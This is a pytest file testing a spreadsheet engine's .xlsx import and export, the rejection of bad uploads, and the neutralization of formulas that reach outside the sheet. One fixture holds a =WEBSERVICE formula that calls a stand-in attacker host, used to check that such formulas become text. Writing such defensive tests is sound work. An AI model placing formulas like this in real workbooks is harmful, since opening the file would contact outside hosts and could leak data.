"""Aicser Sheet engine (IronCalc): new documents, .xlsx round trip, imported formulas that could
run outside the sheet kept as text, and saved documents checked before they're stored."""

import pytest

pytest.importorskip("ironcalc")

import ironcalc  # noqa: E402

from src.modules.workbooks import engine  # noqa: E402


def _book_with(cells):
    m = ironcalc.create("Book", "en", "UTC", "en")
    for (r, c), v in cells.items():
        m.set_user_input(0, r, c, v)
    m.evaluate()
    return m


def test_new_document_is_a_workbook():
    doc = engine.new_doc("Plan")
    assert engine.summary(doc)["sheets"] == ["Sheet1"]


def test_xlsx_round_trip_keeps_formulas_and_values(tmp_path):
    m = _book_with({(1, 1): "120", (2, 1): "80", (3, 1): "=SUM(A1:A2)"})
    path = tmp_path / "in.xlsx"
    m.save_to_xlsx(str(path))
    out = engine.from_xlsx(path.read_bytes())
    back = ironcalc.load_from_bytes(out["doc"], "en")
    assert back.get_cell_content(0, 3, 1) == "=SUM(A1:A2)" and back.get_formatted_cell_value(0, 3, 1) == "200"
    again = ironcalc.load_from_bytes(out["doc"], "en")
    assert engine.to_xlsx(bytes(again.to_bytes()))[:2] == b"PK"


def test_formulas_that_reach_outside_the_sheet_become_text(tmp_path):
    m = _book_with({(1, 1): "=WEBSERVICE(\"http://evil.example\")", (2, 1): "=SUM(1,2)"})
    path = tmp_path / "in.xlsx"
    m.save_to_xlsx(str(path))
    out = engine.from_xlsx(path.read_bytes())
    back = ironcalc.load_from_bytes(out["doc"], "en")
    assert out["neutralized"] == 1
    assert back.get_formatted_cell_value(0, 1, 1).upper().startswith("=WEBSERVICE")  # shown, not run
    assert back.get_cell_content(0, 2, 1) == "=SUM(1,2)"


@pytest.mark.parametrize("data, message", [
    (b"", "empty"),
    (b"a,b\n1,2", "Only .xlsx"),
    (b"PK\x03\x04not really", "couldn't be read"),
])
def test_bad_uploads_are_refused_clearly(data, message):
    with pytest.raises(engine.WorkbookError, match=message):
        engine.from_xlsx(data)


def test_saved_documents_are_checked():
    with pytest.raises(engine.WorkbookError):
        engine.summary(b"garbage")
    with pytest.raises(engine.WorkbookError, match="too large"):
        engine.summary(b"x" * (engine.MAX_DOC_BYTES + 1))
